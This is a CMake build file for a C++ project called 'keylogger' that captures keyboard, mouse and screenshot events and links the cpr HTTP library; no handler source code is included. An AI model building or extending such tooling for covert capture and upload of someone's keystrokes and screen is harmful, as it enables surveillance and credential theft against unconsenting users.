cmake_minimum_required(VERSION 3.30)
project(keylogger)

set(CMAKE_CXX_STANDARD 20)
set(CMAKE_EXE_LINKER_FLAGS "-static")

add_executable(keylogger main.cpp
        layouts.h
        MouseHandler.cpp
        MouseHandler.h
        KeyboardHandler.cpp
        KeyboardHandler.h
        EventLogger.cpp
        EventLogger.h
        ScreenshotHandler.cpp
        ScreenshotHandler.h)

if(WIN32)
    set(CMAKE_LIBRARY_OUTPUT_DIRECTORY ${CMAKE_BINARY_DIR})
    set(CMAKE_RUNTIME_OUTPUT_DIRECTORY ${CMAKE_BINARY_DIR})
endif()

include(FetchContent)
FetchContent_Declare(cpr GIT_REPOSITORY https://github.com/libcpr/cpr.git
        GIT_TAG 4300b348bd491fb88cd9894d358e187bae7eccc5)
FetchContent_MakeAvailable(cpr)


target_link_libraries(keylogger PRIVATE cpr::cpr)